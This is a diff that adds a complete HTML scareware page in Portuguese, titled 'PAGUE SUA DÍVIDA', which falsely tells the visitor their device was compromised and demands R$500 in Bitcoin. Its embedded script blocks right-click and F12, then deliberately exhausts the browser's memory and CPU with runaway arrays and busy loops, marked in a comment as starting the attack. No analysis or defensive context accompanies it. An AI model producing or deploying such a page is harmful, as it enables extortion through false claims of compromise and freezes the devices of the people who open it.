@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>PAGUE SUA DÍVIDA</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+body {
+background: linear-gradient(135deg, #1a1a2e, #16213e);
+color: #fff;
+font-family: Arial, sans-serif;
+display: flex;
+justify-content: center;
+align-items: center;
+height: 100vh;
+margin: 0;
+text-align: center;
+}
+.message {
+max-width: 80%;
+padding: 20px;
+background: rgba(0, 0, 0, 0.7);
+border-radius: 10px;
+box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+}
+h1 {
+font-size: 2.5rem;
+color: #ff0000;
+text-shadow: 0 0 10px rgba(255, 0, 0, 0.8);
+}
+p {
+font-size: 1.2rem;
+}
+.cpu-usage {
+position: absolute;
+bottom: 20px;
+color: #ff0000;
+font-weight: bold;
+}
+</style>
+</head>
+<body>
+<div class="message">
+<h1>PAGUE SUA DÍVIDA</h1>
+<p>Seu dispositivo foi comprometido por vazamento de dados.<br>Pague R$ 500 em Bitcoin para recuperá-lo.</p>
+<p>Endereço: <strong>1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</strong></p>
+</div>
+<div class="cpu-usage">CPU: LOADING...</div>
+
+<script>
+// --- Bloqueio total da tela ---
+document.addEventListener("contextmenu", (e) => e.preventDefault());
+document.addEventListener("keydown", (e) => { if (e.key === "F12") e.preventDefault(); });
+
+// --- Consumo máximo de RAM e CPU ---
+function consumeRAM() {
+let bigArray = [];
+setInterval(() => {
+for (let i = 0; i < 1000; i++) {
+bigArray.push(new Array(10000).fill(Math.random()));
+}
+}, 10);
+}
+
+function maxCPU() {
+setInterval(() => {
+for (let i = 0; i < 999999999; i++) {
+Math.random().toString(36).substring(2);
+}
+}, 10);
+}
+
+// --- Iniciar ataque ---
+consumeRAM();
+maxCPU();
+document.querySelector(".cpu-usage").textContent = "CPU: 100% | MEM: 95%";
+</script>
+</body>
+</html>
